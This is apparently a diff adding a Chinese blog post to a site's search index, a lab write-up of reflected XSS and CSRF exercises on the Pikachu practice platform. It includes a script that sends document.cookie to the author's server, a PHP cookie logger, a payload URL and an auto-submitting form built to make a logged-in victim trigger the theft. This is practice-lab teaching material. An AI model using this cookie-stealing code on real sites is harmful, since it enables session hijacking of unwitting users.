@@ -3,6 +3,75 @@
   
     
     <entry>
+      <title><![CDATA[Pikachu 漏洞练习平台]]></title>
+      <url>/2019/08/14/xss-csrf%E5%AD%A6%E4%B9%A0/</url>
+      <content type="html"><![CDATA[<p><a href="https://bbs.pediy.com/thread-246122.htm" target="_blank" rel="noopener">了解一下?</a></p>
+<a id="more"></a>
+<h1 id="Pikachu-漏洞练习平台"><a href="#Pikachu-漏洞练习平台" class="headerlink" title="Pikachu 漏洞练习平台"></a>Pikachu 漏洞练习平台</h1><p><a href="http://188.131.227.20:999/pikachu/" target="_blank" rel="noopener">已部署的靶场</a>.<br><strong>仅供练习使用, 请不要利用漏洞危害服务器.</strong></p>
+<p>##</p>
+<h2 id="xss-Cross-Site-Scripting"><a href="#xss-Cross-Site-Scripting" class="headerlink" title="xss(Cross-Site Scripting)"></a>xss(Cross-Site Scripting)</h2><h3 id="什么是"><a href="#什么是" class="headerlink" title="什么是"></a>什么是</h3><p>高深莫测版:</p>
+<ul>
+<li>xss: 跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</li>
+<li>csrf: 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li>
+</ul>
+<p>通俗易懂版:</p>
+<ul>
+<li>xss: 通过客户端脚本语言（最常见如：JavaScript），在网页上注入恶意脚本，且代码内容请求外部服务器。</li>
+<li>csrf: 又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。</li>
+</ul>
+<h3 id="反射性xss-get"><a href="#反射性xss-get" class="headerlink" title="反射性xss(get)"></a>反射性xss(get)</h3><p>首先尝试下输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, 发现有字数限制, 然而通过观察或者抓包可以发现参数是通过GET上传的, 那么把刚才的代码赋值给参数message后, 成功的弹窗.<br>然后在服务器写入下面两个文件</p>
+<ul>
+<li><code>get_cookie.js</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://188.131.227.20:999/myxss/index.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>这个js文件可以在页面中追加一个图片资源, 并且指向我们自己的一台服务器的某个文件(即下面的<code>index.php</code>)并向其发送参数. </p>
+<ul>
+<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$time = time();</span><br><span class="line"></span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">$referer = $_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$txt = date(&quot;Y/m/d-h:i:s&quot;).&quot; ip=&quot;.$ip.&quot;  cookie=&quot;.$cookie.&quot; referer=&quot;.$referer.&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo $txt;</span><br><span class="line">file_put_contents(&quot;log.txt&quot;,$txt,FILE_APPEND);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>接收上面传来的参数, 并保存于文件<code>log.txt</code>中<br>这些准备工作完成后, 构造下面的payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://188.131.227.20:999/pikachu/vul/xss/xss_reflected_get.php?message=&lt;script src=http://188.131.227.20:999/myjs/get_cookie.js /&gt;&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器访问后, 再查看<code>log.txt</code>中已经有了访问该链接的用户的cookie.</p>
+<figure class="image-box">
+                <img src="http://188.131.227.20:999/picture/get_cookie.png" alt title class>
+                <p></p>
+            </figure>
+<h3 id="反射性xss-POST"><a href="#反射性xss-POST" class="headerlink" title="反射性xss(POST)"></a>反射性xss(POST)</h3><p>这题让我有些疑惑, 题目最开始是个登陆框, 这里应该是大概要用sql注入或者其它漏洞登陆后才有后续吧? 还好点一下提示后告诉了我们密码, 先登录再说.<br>登录后, 就和上题一样了, 唯一的区别是这次是用POST传参数, 我们抓下包, 修改其中 message 成我们的恶意代码. 后面的一切顺利.</p>
+<p>但是这样还远远不够, 因为仅仅获取了我们自己的cookie.<br>试想下, 如何才能获取其它用户的cookie呢?</p>
+<figure class="image-box">
+                <img src="http://188.131.227.20:999/picture/mind.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>如果使用题目提供的admin账号登录后, 我们发现从登录页面跳转到了真的题目页<code>http://188.131.227.20:999/pikachu/vul/xss/xsspost/xss_reflected_post.php</code>.<br>如果我们登录后直接访问这个页面发现的确不需要使用账号密码. 所以访问这个页面时一定使用了cookie. </p>
+<p>我需要他(受害者)能够提交一份包含着我的代码的表单. 这里就需要伪造一个自动提交表单的页面.<br>可以先看下我们正常提交时的http数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /pikachu/vul/xss/xsspost/xss_reflected_post.php HTTP/1.1</span><br><span class="line">Referer: http://188.131.227.20:999/myxss/xss_post.php</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 94</span><br><span class="line">Host: 188.131.227.20:999</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=172i5in739ti4qqb1f2c752627</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">message=%3Cscript+src%3Dhttp%3A%2F%2F188.131.227.20%3A999%2Fmyjs%2Fget_cookie.js&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>我们的表单需要两个参数<code>message</code>和<code>submit</code>.<br>它们的值先预先写进网页中, 在使用js脚本自动提交.<br><code>xss_post.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://188.131.227.20:999/pikachu/vul/xss/xsspost/xss_reflected_post.php"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"xssr_in"</span> <span class="attr">type</span>= <span class="string">"text"</span> <span class="attr">maxlength</span>=<span class="string">"20"</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"&lt;script src=http://188.131.227.20:999/myjs/get_cookie.js /&gt;"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"postsubmit"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.getElementById(<span class="string">"postsubmit"</span>).click();</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以现在只需要让受害者访问<code>http://188.131.227.20:999/myxss/xss_post.php</code>这个页面, 我就能直接获得他在这个页面的cookie, 简直不要太爽!(前提是该用户必须已经登录过)</p>
+<figure class="image-box">
+                <img src="http://188.131.227.20:999/picture/post_cookie.png" alt title class>
+                <p></p>
+            </figure>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> xss </tag>
+            
+            <tag> csrf </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[实战中可能会用到的几个技巧]]></title>
       <url>/2019/07/29/%E5%AE%9E%E6%88%98%E4%B8%AD%E5%8F%AF%E8%83%BD%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E6%8A%80%E5%B7%A7/</url>
       <content type="html"><![CDATA[<h1 id="实战中可能会用到的几个技巧"><a href="#实战中可能会用到的几个技巧" class="headerlink" title="实战中可能会用到的几个技巧"></a>实战中可能会用到的几个技巧</h1><a id="more"></a>
